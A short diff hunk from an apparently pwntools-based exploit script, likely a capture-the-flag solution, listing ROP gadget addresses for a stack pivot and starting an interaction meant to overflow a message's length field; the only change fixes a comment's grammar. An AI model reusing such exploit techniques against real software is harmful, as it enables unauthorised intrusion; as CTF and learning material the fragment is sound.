@@ -9,7 +9,7 @@ add_esp_0x2C_ret = 0x08048fcd # Actually : add esp, 0x24 ; pop ebx ; pop ebp ; r
 mov_eax_edx_ret = 0x080671c4 # mov eax, edx ; ret
 xchg_eax_esp_ret = 0x0804bb6c # xchg eax, esp ; ret
 
-# Create a message with a length that'll overflow into it's own length field
+# Create a message with a length that'll overflow into its own length field
 log.info("Creating first message")
 p.recvuntil("Enter Choice:")
 p.sendline("1")
